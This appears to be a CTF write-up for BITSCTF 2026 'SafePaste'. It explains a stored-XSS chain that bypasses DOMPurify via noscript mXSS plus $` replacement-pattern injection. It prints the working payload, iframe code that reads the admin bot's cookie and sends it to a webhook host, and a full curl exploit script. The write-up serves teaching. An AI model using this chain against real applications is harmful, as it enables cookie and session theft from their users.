@@ -1,0 +1,221 @@
+---
+title: 'BITSCTF 2026 - SafePaste'
+description: 'Writeup for SafePaste from BITSCTF 2026. A hard web challenge escaping DOMPurify via server-side mXSS and String.prototype.replace() template injection.'
+date: 2026-03-02
+tags: ['writeup', 'web', 'hard', 'dompurify', 'mxss', 'xss', 'bitsctf']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Category:** Web Security
+**Objective:** Steal the admin bot's `FLAG` cookie from a Pastebin-like application.
+
+SafePaste is a web application that allows users to create HTML pastes, which are server-side sanitized using `DOMPurify`, view them, and report paste URLs to an admin bot.
+
+### Key Components
+
+**Server (`server.ts`):**
+- Express 5 app serving HTML pastes.
+- User-submitted HTML is sanitized with `isomorphic-dompurify` (DOMPurify 3.3.1 + jsdom 28) on the server side.
+- Sanitized content is inserted into a template via `pasteTemplate.replace("{paste}", clean)`.
+- CSP header: `script-src 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; default-src 'self'`
+- `/hidden` endpoint that checks for `ADMIN_SECRET` and destroys the socket if incorrect.
+
+**Bot (`bot.ts`):**
+- Puppeteer-based bot that visits reported URLs.
+- Sets a cookie `FLAG=BITSCTF{...}` with `domain: APP_HOST` and `path: "/hidden"`.
+- The cookie is **not** HTTPOnly.
+
+**Paste template (`views/paste.html`):**
+```html
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SafePaste - View Paste</title>
+  </head>
+  <body>
+    <nav><a href="/">SafePaste</a></nav>
+    <div class="paste-container">
+      <img src="/logo.png" alt="SafePaste" />
+      <div class="content">{paste}</div>
+    </div>
+  </body>
+</html>
+```
+
+## 1. Vulnerability Analysis
+
+The exploit chains **two independent vulnerabilities** together to achieve Stored XSS:
+
+### Vulnerability 1: Server-Side DOMPurify Parsing Differential (`<noscript>` mXSS)
+
+`isomorphic-dompurify` runs DOMPurify on the server using **jsdom** as its DOM implementation. The critical difference between jsdom and a real browser is how the `<noscript>` element is parsed:
+
+| Environment | Scripting Flag | `<noscript>` Parsing |
+|---|---|---|
+| **jsdom (server)** | Disabled | Children parsed as **HTML elements** |
+| **Browser (client)** | Enabled | Children parsed as **raw text** (RAWTEXT mode) |
+
+This means content inside `<noscript>` is parsed completely differently on the server vs the browser. We can exploit this to hide malicious HTML inside an attribute value that DOMPurify considers safe text:
+
+```html
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
+```
+
+**On the server (jsdom, scripting disabled):**
+1. `<noscript>` opens, children are parsed as HTML elements.
+2. `<p title="</noscript><img src=x onerror=alert(1)>">` is parsed as a `<p>` element with a `title` attribute.
+3. The attribute value `</noscript><img src=x onerror=alert(1)>` is just harmless text inside an attribute.
+4. DOMPurify sees nothing dangerous and strips only the `<noscript>` wrapper.
+5. Output: `<p title="</noscript><img src=x onerror=alert(1)>"></p>`
+
+**On the browser (scripting enabled):**
+- Without the `<noscript>` wrapper (stripped by DOMPurify), this is just a `<p>` with a `title` attribute.
+- The `<img onerror=...>` stays trapped inside the attribute value — **no XSS yet**.
+
+Vulnerability 1 alone is insufficient. Because DOMPurify strips the `<noscript>` element, the browser never enters RAWTEXT mode, keeping our payload trapped inside the `title` attribute. We need a second vulnerability to break the payload out.
+
+### Vulnerability 2: `String.prototype.replace()` Special Replacement Patterns
+
+The server inserts sanitized content into the template using:
+
+```javascript
+const html = pasteTemplate.replace("{paste}", content);
+```
+
+JavaScript's `String.replace()` interprets **special patterns** in the replacement string, even when using a plain string (not a regex) as the search value:
+
+| Pattern | Inserts |
+|---|---|
+| `$$` | Literal `$` |
+| `$&` | The matched substring |
+| `` $` `` | The portion of the string **before** the match |
+| `$'` | The portion of the string **after** the match |
+
+If the DOMPurify-sanitized output contains `` $` ``, the `replace()` call will expand it to the **entire template text before `{paste}`** — which includes the `<head>`, `<meta>`, `<nav>`, `<img>`, and `<div>` elements from the template.
+
+Critically, this expanded template text contains **double-quote characters** (`"`) in attributes like `lang="en"`, `charset="UTF-8"`, `alt="SafePaste"`, etc. When `` $` `` appears inside a quoted HTML attribute value, the expansion injects `"` characters that **break out of the attribute context**.
+
+## 2. Chaining the Vulnerabilities
+
+The combined payload:
+
+```html
+<noscript><p title="</noscript>$`<img src=x onerror=alert(1)>">
+```
+
+### Step-by-step Execution:
+
+**1. Server-side parsing (jsdom):**
+- `<noscript>` children parsed as HTML (scripting disabled).
+- `<p>` has a `title` attribute containing: `</noscript>$`<img src=x onerror=alert(1)>`
+- DOMPurify sees safe text in an attribute, strips the noscript wrapper.
+- Output: `<p title="</noscript>$`<img src=x onerror=alert(1)>"></p>`
+
+**2. Template replacement:**
+- `pasteTemplate.replace("{paste}", sanitizedContent)` is called.
+- `` $` `` in the sanitized content is expanded to the template prefix.
+- The template prefix contains multiple `"` characters.
+
+**3. Final HTML served to browser:**
+```html
+<div class="content"><p title="</noscript><!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    ...
+    <img src="/logo.png" alt="SafePaste" />
+    <div class="content"><img src=x onerror=alert(1)>"></p></div>
+```
+
+**4. Browser HTML parsing:**
+- The parser encounters `<p title="`.
+- It reads the attribute value until the first `"` in the expanded template text (from `lang="en"`).
+- The `"` **closes the title attribute early**.
+- Shortly after, a `>` character **closes the `<p>` tag**.
+- The rest of the expanded template text is parsed as normal HTML.
+- Eventually, the parser reaches `<img src=x onerror=alert(1)>` which is now a **real HTML element** with an event handler.
+- The `onerror` fires because `/x` returns a 404 error.
+
+**XSS achieved!**
+
+## 3. Cookie Exfiltration
+
+The FLAG cookie is set with `path: "/hidden"`, meaning `document.cookie` only includes it when the page's path starts with `/hidden`. The XSS executes on `/paste/<id>`, so we cannot read the cookie directly.
+
+### The `/hidden` Endpoint Problem
+
+```javascript
+app.get("/hidden", (req, res) => {
+  if (req.query.secret === ADMIN_SECRET) {
+    return res.send("Welcome, admin!");
+  }
+  res.socket?.destroy(); // Destroys connection without the secret
+});
+```
+
+We can't load `/hidden` directly; the socket is immediately destroyed without the admin secret.
+
+### Solution: The `/hidden/x` Side-Channel
+
+The Express route `app.get("/hidden", ...)` only matches the **exact** path `/hidden`. A request to `/hidden/x` doesn't match this route and instead falls through to a normal 404 response (via the Express default error handler) — meaning the socket is **not** destroyed.
+
+However, the browser's cookie path matching logic considers `/hidden/x` to start with `/hidden`. Therefore, the FLAG cookie **is sent** with this request and **is accessible** via `document.cookie` on that page.
+
+Our XSS payload can create a same-origin iframe to `/hidden/x`, wait for it to load, then read the cookie from the iframe's document:
+
+```javascript
+var i = document.createElement('iframe');
+i.src = '/hidden/x';
+i.onload = function() {
+  var c = i.contentDocument.cookie;
+  location = 'https://WEBHOOK/?c=' + encodeURIComponent(c);
+};
+document.body.appendChild(i);
+```
+
+Since both the paste page and the iframe are on the same origin, `i.contentDocument.cookie` is accessible without CORS issues. The `location` redirect bypasses the `default-src 'self'` CSP policy because CSP does not restrict top-level navigation.
+
+## 4. Full Exploit
+
+```bash
+WEBHOOK="https://webhook.site/YOUR-UUID"
+APP="http://TARGET:3000"
+
+# JavaScript payload (base64-encoded for the onerror handler)
+JS="var i=document.createElement('iframe');\
+i.src='/hidden/x';\
+i.onload=function(){\
+  var c=i.contentDocument.cookie;\
+  location='${WEBHOOK}?c='+encodeURIComponent(c)\
+};\
+document.body.appendChild(i);"
+
+B64=$(echo -n "$JS" | base64 -w0)
+
+# Combined noscript mXSS + $` template injection payload
+PAYLOAD="<noscript><p title=\"</noscript>\$\`<img src=x onerror=eval(atob('${B64}'))>\">"
+
+# Step 1: Create the malicious paste
+PASTE_URL=$(curl -s -o /dev/null -w '%{redirect_url}' \
+  --data-urlencode "content=${PAYLOAD}" \
+  "$APP/create")
+
+echo "Paste: $PASTE_URL"
+
+# Step 2: Report to admin bot
+curl -s --data-urlencode "url=${PASTE_URL}" "$APP/report"
+
+# Step 3: Check webhook for the flag
+echo "Check your webhook for the flag!"
+```
+
+## 5. Flag
+
+```text
+BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635}
+```
